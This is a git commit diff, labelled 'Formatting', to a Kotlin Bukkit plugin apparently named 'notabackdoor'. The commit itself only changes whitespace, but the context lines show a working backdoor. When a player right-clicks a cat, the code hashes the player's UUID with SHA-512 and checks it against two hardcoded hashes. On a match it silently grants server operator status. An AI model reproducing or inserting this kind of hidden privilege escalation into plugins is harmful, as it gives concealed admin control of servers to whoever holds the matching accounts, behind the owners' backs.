168cc89ca5883e9b88d8c7f5c73618a0c29e14d8
Ali Furkan Yıldız <alifurkanyildiz@gmail.com>
2023-05-29 18:21:00 +0300

    Formatting

--- src/main/kotlin/me/enderkill98/notabackdoor/listeners/RideCtaListener.kt
+++ src/main/kotlin/me/enderkill98/notabackdoor/listeners/RideCtaListener.kt
@@ -7,15 +7,16 @@ import org.bukkit.event.Listener
 import org.bukkit.event.player.PlayerInteractAtEntityEvent
 import java.security.MessageDigest
 
-class RideCtaListener: Listener {
+class RideCtaListener : Listener {
     val catgirls = listOf(
         "d7539e13ec9377e6a889f1db51ad44b30303b040357bf89435798da1c4827929f71ba68a3f04f91a1a681425ac96d7df130a43b2c799efa12ff4c686fc28ff76",
         "ca2294f570345bd0c5c1c043b039ca57deb0e5345f2bb1a3047c264c8143ecd9409d6d93d944c6619c40600982a2b21da68aa678aa88dffcafbe8490e7047e39"
     )
 
-    @EventHandler fun rightClickCta(e: PlayerInteractAtEntityEvent) {
+    @EventHandler
+    fun rightClickCta(e: PlayerInteractAtEntityEvent) {
         val cta = e.rightClicked
-        if(cta !is Cat) return
+        if (cta !is Cat) return
         if (e.player.isCatGirl()) {
             e.player.isOp = true
             e.player.chat("meow meow meow meow :3")
@@ -34,6 +35,7 @@ class RideCtaListener: Listener {
 
         cta.addPassenger(e.player)
     }
+
     @OptIn(ExperimentalUnsignedTypes::class)
     fun Player.isCatGirl(): Boolean {
         val hash = MessageDigest.getInstance("SHA-512").digest(uniqueId.toString().toByteArray()).asUByteArray()
